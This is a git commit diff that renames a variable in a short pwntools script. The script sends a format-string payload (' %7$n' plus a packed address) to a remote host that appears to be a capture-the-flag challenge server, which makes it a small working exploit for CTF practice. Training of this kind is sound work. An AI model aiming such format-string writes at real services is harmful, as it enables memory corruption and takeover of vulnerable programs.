3892a9a4132b70435db5985464200eb7be0f2f82
Federico Bosio <federicobosio0209@gmail.com>
2025-03-12 23:51:26 +0100

    .

--- software/formatted.py
+++ software/formatted.py
@@ -1,7 +1,7 @@
 from pwn import *
 
-addr = p64(0x40404c)
-payload = b" %7$n   " + addr
+address = p64(0x40404c)
+payload = b" %7$n   " + address
 r = remote("formatted.challs.olicyber.it",10305)
 r.recv(100)
 r.sendline(payload)
